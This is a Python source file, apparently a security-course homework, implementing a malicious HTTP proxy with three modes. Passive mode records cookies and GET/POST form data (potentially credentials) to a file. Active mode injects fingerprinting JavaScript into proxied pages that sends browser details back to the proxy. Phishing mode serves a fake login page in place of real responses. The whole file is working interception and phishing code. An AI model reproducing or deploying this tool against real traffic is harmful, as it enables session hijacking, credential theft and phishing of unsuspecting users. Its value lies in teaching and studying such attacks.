#
# proxy.py
#
# Implement a malicious proxy that operates in either passive,
# active, or phishing mode. In passive mode, the proxy observes
# all the cleartext traffic and extracts certain sensitive
# information. In active mode, the proxy injects malicious Javascript
# code to the packets. In the phishing mode, the proxy sends a
# phishing page instead of a legitimate response.
#
# Inline arguments:-
# -m: The mode the proxy will operate on, which is either active, passive, or phishing.
# listening_ip: The IP address the proxy listens for connections on.
# listening_port: The port the proxy will listen for connections on.
#
# Homework 4
# Course: CS 468, Fall 2023, UIC
# Author: Himanshu Dongre
# 
import argparse
import http.server
import socketserver
import requests
from sys import exit
from bs4 import BeautifulSoup

JSCODE = []

class PassiveModeHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request for {self.path}")
        # Extract and record data from URL and cookie (if there is one)
        parse_get_url(self.path, "info_1.txt")
        cookie = self.headers.get("Cookie")
        if cookie is not None:
            with open("info_1.txt", "a") as info1:
                info1.write(f"cookie: {cookie}\n")
        # Forward GET request to domain and obtain response
        resp = requests.get(self.path)
        # Forward response to client
        self.send_response(resp.status_code)
        headers = resp.headers
        for key in headers:
            if key != "Content-Encoding":
                # Extract and record cookie if there is one
                if key == "Cookie":
                    with open("info_1.txt", "a") as info1:
                        info1.write(f"cookie: {headers[key]}\n")
                self.send_header(key, headers[key])
        self.end_headers()
        self.wfile.write(resp.content)

    def do_POST(self):
        print(f"Received POST request for {self.path}")
        # Extract and record cookie if there is one
        cookie = self.headers.get("Cookie")
        if cookie is not None:
            with open("info_1.txt", "a") as info1:
                info1.write(f"cookie: {cookie}\n")
        # Extract and record data from POST request
        content_length = int(self.headers.get('Content-Length'))
        data = self.rfile.read(content_length).decode('utf-8')
        parse_post_req(data, "info_1.txt")
        # Forward POST request to domain and obtain response
        resp = requests.post(self.path)
        # Forward response to client
        self.send_response(resp.status_code)
        headers = resp.headers
        for key in headers:
            if key != "Content-Encoding":
                # Extract and record cookie if there is one
                if key == "Cookie":
                    with open("info_1.txt", "a") as info1:
                        info1.write(f"cookie: {headers[key]}\n")
                self.send_header(key, headers[key])
        self.end_headers()
        self.wfile.write(resp.content)


class ActiveModeHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request for {self.path}")
        if self.path.startswith("/"):
            parse_get_url(self.path, "info_2.txt")
            return
        # Forward GET request to domain and obtain response
        resp = requests.get(self.path)
        # Inject Javascript code to fingerprint user
        content = inject_js(resp.text)
        # Forward response to client
        self.send_response(resp.status_code)
        headers = resp.headers
        for key in headers:
            if key != "Content-Encoding":
                if key == "Content-Length":
                    self.send_header(key, len(content))
                else:
                    self.send_header(key, headers[key])
        self.end_headers()
        self.wfile.write(content)

    def do_POST(self):
        print(f"Received POST request for {self.path}")
        if self.path.startswith("/"):
            return
        # Forward POST request to domain and obtain response
        resp = requests.post(self.path)
        # Inject Javascript code to fingerprint user
        content = inject_js(resp.text)
        # Forward response to client
        self.send_response(resp.status_code)
        headers = resp.headers
        for key in headers:
            if key == "Content-Length":
                self.send_header(key, len(content))
            else:
                self.send_header(key, headers[key])
        self.end_headers()
        self.wfile.write(content)


class PhishingModeHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request for {self.path}")
        # Read in phishing page HTML source
        with open("login.html", "r") as html:
            PHISHPAGE = html.read().encode("utf-8")
        # Send phishing page instead of forwarding to domain
        self.send_response(200)
        self.send_header("Content-Length", len(PHISHPAGE))
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PHISHPAGE)

    def do_POST(self):
        print(f"Received POST request for {self.path}")
        # Read in phishing page HTML source
        with open("login.html", "r") as html:
            PHISHPAGE = html.read().encode("utf-8")
        # Send phishing page instead of forwarding to domain
        self.send_response(200)
        self.send_header("Content-Length", len(PHISHPAGE))
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PHISHPAGE)


def main():
    # Parse inline arguments
    argparser = argparse.ArgumentParser(description="CS468 malicious proxy")
    argparser.add_argument("-m", help="The mode you want your proxy to operate, which will either be active or passive", type=str, required=True)   
    argparser.add_argument("listening_ip", help="The IP address your proxy will listen for connections on", type=str, default="localhost")   
    argparser.add_argument("listening_port", help="The port your proxy will listen for connections on", type=int, default=5555)
    args = argparser.parse_args()
    
    # Start proxy server in the specified mode
    print(f"Server listening on port {args.listening_port}...")
    if args.m == "passive":
        server = http.server.HTTPServer((args.listening_ip, args.listening_port), PassiveModeHandler)
    elif args.m == "active":
        # Read in Javascript code
        with open("injection.js", "r") as js:
            for row in js:
                row = row.strip()
                if row == "//URL":
                    row = f'var req = "http://{args.listening_ip}:{args.listening_port}/?user-agent=" + userAgent + "&screen=" + viewportHeight + "x" + viewportWidth + "&lang=" + userLanguage;'
                JSCODE.append(row)
        server = http.server.HTTPServer((args.listening_ip, args.listening_port), ActiveModeHandler)
    elif args.m == "phishing":
        server = http.server.HTTPServer((args.listening_ip, args.listening_port), PhishingModeHandler)
    else:
        print("*** Invalid mode")
        exit(1)

    # Run in infinite loop serving GET and POST
    # requests as specified by the handler
    server.serve_forever()


def parse_get_url(url, filename):
    """
    Parse the given GET URL for sensitive information,
    and append the information to the given file.
    """
    try:
        uri, data = url.split("?")
    except ValueError:
        return
    fields = data.split("&")
    with open(filename, "a") as f:
        for field in fields:
            key, value = field.split("=")
            f.write(f"{key}: {value}\n")


def parse_post_req(req, filename):
    """
    Parse the given POST request for sensitive information,
    and append the information to the given file.
    """
    fields = req.split("&")
    with open(filename, "a") as f:
        for field in fields:
            key, value = field.split("=")
            f.write(f"{key}: {value}\n")


def inject_js(html):
    """
    Inject malicious Javascript code into the
    provided HTML, and return the modified document
    encoded in UTF-8.
    """
    soup = BeautifulSoup(html, "html.parser")
    html = soup.prettify()
    rows = html.strip().split("\n")
    print(rows)
    rows.remove("</html>")
    rows.append("<script>")
    rows.extend(JSCODE)
    rows.append("</script>")
    rows.append("</html>")
    trojan = "\n".join(rows)
    trojan_soup = BeautifulSoup(trojan, "html.parser")
    trojan = trojan_soup.prettify()
    return trojan.encode("utf-8")


if __name__ == "__main__":
    main()